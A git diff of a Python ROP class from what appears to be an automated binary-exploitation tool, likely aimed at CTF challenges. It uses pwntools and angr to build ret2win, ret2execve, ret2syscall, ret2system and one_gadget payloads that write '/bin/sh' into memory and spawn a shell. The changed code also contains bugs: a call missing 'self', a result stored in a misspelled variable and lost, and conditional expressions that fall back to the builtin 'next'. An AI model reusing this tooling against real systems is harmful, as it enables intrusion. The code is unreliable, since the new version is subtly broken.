@@ -13,7 +13,8 @@ logging.getLogger('os').setLevel(logging.WARNING)
 logging.getLogger('pwnlib').setLevel(logging.WARNING)
 
 class ROP:
-    def __init__(self, analysis, v_lvl, p): 
+    def __init__(self, analysis, v_lvl, p):
+        self.arop = False
         self.fart_print = Print(v_lvl)
         self.analysis = analysis
         self.filename = analysis.binary
@@ -29,44 +30,45 @@ class ROP:
         self.cache_angrop = b''
 
     def write_binsh_to_mem(self):
-        if(False or 1<=self.num_pops(self.get_primitives_str())):
-            self.analysis.hbsh = True
-            return self.write_binsh_manual()
-        elif self.cache_angrop == b'':
-            angr_proj = angr.Project(self.analysis.binary)
-            angr_rop  = angr_proj.analyses.ROP()
-            #angr_rop.find_gadgets_single_threaded() 
-            angr_rop.find_gadgets()
-            self.analysis.hbsh = True
-            self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
-            return self.cache_angrop
-        
+        if(self.arop):
+            return write_binsh_manual()
+        else:
+            if self.cache_angrop == b'':
+                angr_proj = angr.Project(self.analysis.binary)
+                angr_rop  = angr_proj.analyses.ROP()
+                angr_rop.find_gadgets()
+                self.analysis.hbsh = True
+                self.cache_angrop = angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
+                return self.cache_angrop
+            
     def build_exploit(self, failed=False):
+        self.arop = failed
         self.fart_print.info("Attempting to discover the constraints to exploiting the buffer overflow")
         payload = None
         if self.analysis.has_win():
             if self.analysis.win_has_args():
                 if self.analysis.has_execve():
-                    payload = self.ret2execve(failed)
+                    payload = self.ret2execve()
                 elif self.analysis.has_syscall():
-                    payload = self.ret2syscall(failed)
+                    payload = self.ret2syscall()
                 elif self.analysis.has_system():
-                    payload = self.ret2system(failed)
+                    payload = self.ret2system()
                 else:
-                    payload = self.ret2win_with_args(failed)
+                    payload = self.ret2win_with_args()
             else:
-                payload = self.ret2win(failed)
+                payload = self.ret2win()
         elif self.analysis.has_execve():
-            payload = self.ret2execve(failed)
+            payload = self.ret2execve()
         elif self.analysis.has_system():
-            payload = self.ret2system(failed)
+            payload = self.ret2system()
         elif self.analysis.has_syscall():
-            payload = self.ret2syscall(failed)
+            payload = self.ret2syscall()
         elif self.analysis.has_leak_string():
-            payload = self.ret2one(failed)
+            payload = self.ret2one()
         else:
             self.fart_print.warning("Exploit not found!")
         
+        #payload = payload+self.realign() if (0!=(((len(payload)-len(self.offset))+8)%16)) else next # needs to be in each fcn
         return payload
     
     def set_offset(self):
@@ -88,63 +90,53 @@ class ROP:
             self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
             return Get2overflow(self.filename, self.v_lvl).buf()
 
-    def ret2win(self, failed):
+    def ret2win(self):
         self.fart_print.info("Crafting payload for ret2win")
         payload = self.offset
-        if failed:
-            payload += self.realign()
         payload += p64(self.e.sym["win"])
-        
+        payload = payload+self.realign() if (0!=(((len(payload)-len(self.offset))+8)%16)) else next
         return payload
     
-    def ret2win_with_args(self, failed):
+    def ret2win_with_args(self):
         self.fart_print.info("Crafting payload for ret2win with args")
         #TODO: Instead of passing address to win, return address to system or execve inside of win to avoid argument
         payload = self.offset
         payload += self.satisfy_win()
-        if failed:
-            payload += self.realign()
         payload += p64(self.e.sym['win'])
-
+        payload = payload+self.realign() if (0==(((len(payload)-len(self.offset))+8)%16)) else next
         return payload
 
-    def ret2execve(self, failed):
+    def ret2execve(self):
         self.fart_print.info("Crafting payload for ret2execve")
         payload = self.offset
         payload += self.generic_first_arg()
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
-        if failed:
-            payload += self.realign()
         payload += p64(self.e.sym["execve"])
-
+        payload = payload+self.realign() if (0==(((len(payload)-len(self.offset))+8)%16)) else next
         return payload
 
-    def ret2syscall(self, failed):
+    def ret2syscall(self):
         self.fart_print.info("Crafting payload for ret2syscall")
         payload = self.offset
         payload += self.fill_reg("rax", 59)
         payload += self.generic_first_arg()
         payload += self.fill_reg("rsi", 0)
         payload += self.fill_reg("rdx", 0)
-        if failed:
-            self.realign()
         payload += p64(self.get_syscall())
-        
+        pyload = payload+self.realign() if (0==(((len(payload)-len(self.offset))+8)%16)) else next
         return payload
     
-    def ret2system(self, failed):
+    def ret2system(self):
         self.fart_print.info("Crafting payload for ret2system")
         payload = self.offset
         payload += self.generic_first_arg() 
         payload += self.fill_reg("rsi", 0)
-        if failed:
-            payload += self.realign()
         payload += p64(self.e.sym['system'])
-        
+        payload = payload+self.realign() if (0==(((len(payload)-len(self.offset))+8)%16)) else next
         return payload
 
-    def ret2one(self, failed):
+    def ret2one(self):
         self.fart_print.info("Crafting payload for ret2one")
         payload = self.offset
         
@@ -158,12 +150,11 @@ class ROP:
         
         gadget_offset = self.one_gadget()[1]
         gadget_addr = base + gadget_offset
-        if failed:
-            payload += self.realign()
+        
         payload += p64(gadget_addr)
         payload += p64(0)*0x50
         self.analysis.hbsh = True
-        
+        payload = payload+self.realign() if (0==(((len(payload)-len(self.offset))+8)%16)) else next
         return payload
 
     def generic_first_arg(self):
